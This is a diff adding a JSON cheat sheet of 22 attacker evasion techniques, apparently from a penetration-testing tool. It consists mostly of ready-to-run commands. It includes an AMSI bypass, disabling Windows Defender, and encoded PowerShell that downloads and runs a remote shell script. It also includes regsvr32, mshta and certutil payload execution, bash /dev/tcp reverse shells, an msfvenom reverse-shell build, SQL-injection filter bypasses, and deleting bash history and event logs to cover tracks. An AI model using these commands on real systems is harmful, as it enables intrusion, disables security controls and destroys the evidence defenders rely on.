@@ -1,0 +1,91 @@
+[
+  {
+    "category": "Evasion Techniques",
+    "techniques": [
+      {
+        "id":"ev_1","name":"Command Injection - Slash Bypass (c/at)","purpose":"Bypass blacklist filtering specific command names","when_to_use":"When 'cat' is blacklisted by WAF or filter",
+        "command":"c'a't /etc/passwd\nc\"a\"t /etc/passwd\nca$()t /etc/passwd\n/bin/c?t /etc/passwd","tags":["evasion","cmdi","bypass"]
+      },
+      {
+        "id":"ev_2","name":"Command Injection - Space Bypass","purpose":"Bypass space character filtering","when_to_use":"When spaces are filtered in command injection",
+        "command":"cat${IFS}/etc/passwd\ncat$IFS/etc/passwd\ncat</etc/passwd\n{cat,/etc/passwd}","tags":["evasion","cmdi","bypass"]
+      },
+      {
+        "id":"ev_3","name":"Command Injection - Semicolon/Newline Bypass","purpose":"Bypass && and || operator filters","when_to_use":"When && and | are filtered",
+        "command":"127.0.0.1%0aid\n127.0.0.1%0a%0aid\n127.0.0.1;id\n127.0.0.1%3bid","tags":["evasion","cmdi","bypass"]
+      },
+      {
+        "id":"ev_4","name":"Command Injection - Backtick/Subshell","purpose":"Execute commands inside other commands","when_to_use":"When semicolons are filtered",
+        "command":"127.0.0.1`id`\n127.0.0.1$(id)\n127.0.0.1$((id))","tags":["evasion","cmdi","bypass"]
+      },
+      {
+        "id":"ev_5","name":"PowerShell - Execution Policy Bypass","purpose":"Run PowerShell scripts when policy blocks them","when_to_use":"When PowerShell execution policy is Restricted",
+        "command":"powershell -ExecutionPolicy Bypass -File script.ps1\npowershell -ep bypass -c \"IEX(...)\"","tags":["evasion","powershell","windows"]
+      },
+      {
+        "id":"ev_6","name":"PowerShell - AMSI Bypass (Memory Patch)","purpose":"Disable AMSI to run malicious scripts","when_to_use":"When AMSI is blocking PowerShell payloads",
+        "command":"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)","tags":["evasion","amsi","powershell"]
+      },
+      {
+        "id":"ev_7","name":"PowerShell - Base64 Encoded Command","purpose":"Obfuscate PowerShell commands","when_to_use":"When plain PowerShell is detected/blocked",
+        "command":"$cmd = 'IEX(New-Object Net.WebClient).DownloadString(\"http://{TARGET_IP}:8080/shell.ps1\")'\n$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))\npowershell -enc $enc","tags":["evasion","powershell","obfuscation"]
+      },
+      {
+        "id":"ev_8","name":"Windows Defender Exclusion","purpose":"Add path to Defender exclusion list","when_to_use":"After gaining admin — before dropping payloads",
+        "command":"Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp'\nAdd-MpPreference -ExclusionExtension '.exe'","tags":["evasion","defender","windows"]
+      },
+      {
+        "id":"ev_9","name":"Disable Windows Defender","purpose":"Completely disable Windows Defender","when_to_use":"After gaining admin access on Windows",
+        "command":"Set-MpPreference -DisableRealtimeMonitoring $true\nnet stop WinDefend","tags":["evasion","defender","windows"]
+      },
+      {
+        "id":"ev_10","name":"msfvenom Encoded Payload","purpose":"Encode payload to evade AV signatures","when_to_use":"When plain msfvenom payloads are detected",
+        "command":"msfvenom -p windows/x64/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o shell_enc.exe","tags":["evasion","msfvenom","av"]
+      },
+      {
+        "id":"ev_11","name":"Living off the Land - Regsvr32","purpose":"Execute payload using trusted Windows binary","when_to_use":"When .exe execution is blocked",
+        "command":"regsvr32 /s /n /u /i:http://{TARGET_IP}:8080/payload.sct scrobj.dll","tags":["evasion","lolbas","windows"]
+      },
+      {
+        "id":"ev_12","name":"Living off the Land - Mshta","purpose":"Execute HTA payload via trusted binary","when_to_use":"When .exe is blocked but mshta is available",
+        "command":"mshta http://{TARGET_IP}:8080/payload.hta","tags":["evasion","lolbas","windows"]
+      },
+      {
+        "id":"ev_13","name":"Living off the Land - Certutil Decode","purpose":"Decode and execute payload via certutil","when_to_use":"When direct execution is blocked",
+        "command":"certutil -decode encoded_payload.txt shell.exe && shell.exe","tags":["evasion","lolbas","certutil"]
+      },
+      {
+        "id":"ev_14","name":"Linux - Obfuscate Command with Variables","purpose":"Bypass string-based command filters","when_to_use":"When specific command strings are blacklisted",
+        "command":"a=c;b=at;$a$b /etc/passwd\nwho$@ami\nwho$()ami","tags":["evasion","linux","bypass"]
+      },
+      {
+        "id":"ev_15","name":"Linux - Reverse Shell via /dev/tcp (No nc)","purpose":"Get reverse shell without netcat","when_to_use":"When netcat is not available on target",
+        "command":"bash -i >& /dev/tcp/{TARGET_IP}/4444 0>&1\nexec 5<>/dev/tcp/{TARGET_IP}/4444; cat <&5 | while read line; do $line 2>&5 >&5; done","tags":["evasion","shell","linux"]},
+      {
+        "id":"ev_16","name":"WAF Bypass - URL Encoding","purpose":"Bypass WAF by encoding special characters","when_to_use":"When WAF blocks special characters in URL",
+        "command":"curl 'http://{TARGET_IP}/page?id=1%27%20OR%201%3D1--'\ncurl 'http://{TARGET_IP}/page?cmd=id%0a'","tags":["evasion","waf","web"]
+      },
+      {
+        "id":"ev_17","name":"WAF Bypass - Case Variation (SQLi)","purpose":"Bypass case-sensitive WAF rules","when_to_use":"When WAF blocks lowercase SQL keywords",
+        "command":"' Or 1=1--\n' oR '1'='1\n' UNION SeLeCt null,null--","tags":["evasion","waf","sqli"]
+      },
+      {
+        "id":"ev_18","name":"WAF Bypass - Comment Injection (SQLi)","purpose":"Break up SQL keywords with comments","when_to_use":"When WAF detects SQL keywords",
+        "command":"' UN/**/ION SE/**/LECT null,null--\n' /*!UNION*/ /*!SELECT*/ null,null--","tags":["evasion","waf","sqli"]
+      },
+      {
+        "id":"ev_19","name":"Process Injection via PowerShell","purpose":"Inject shellcode into legitimate process","when_to_use":"When AV monitors new process creation",
+        "command":"$pid = (Get-Process explorer).Id\n# Use Invoke-Shellcode or similar to inject into PID","tags":["evasion","injection","powershell"]
+      },
+      {
+        "id":"ev_20","name":"Timestomp - Modify File Timestamps","purpose":"Hide file creation time to avoid forensics","when_to_use":"After dropping files on target","command":"touch -t 202001010000 /tmp/shell.sh\n# Windows: (Get-Item shell.exe).LastWriteTime = '01/01/2020 00:00:00'","tags":["evasion","forensics","stealth"]
+      },
+      {
+        "id":"ev_21","name":"Clear Bash History","purpose":"Remove command history to cover tracks","when_to_use":"Before leaving a compromised Linux host","command":"history -c && history -w\nunset HISTFILE\nexport HISTSIZE=0\nrm -f ~/.bash_history","tags":["evasion","stealth","linux"]
+      },
+      {
+        "id":"ev_22","name":"Clear Windows Event Logs","purpose":"Remove evidence from Windows event logs","when_to_use":"Before leaving a compromised Windows host","command":"wevtutil cl System && wevtutil cl Security && wevtutil cl Application\nGet-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }","tags":["evasion","stealth","windows"]
+      }
+    ]
+  }
+]
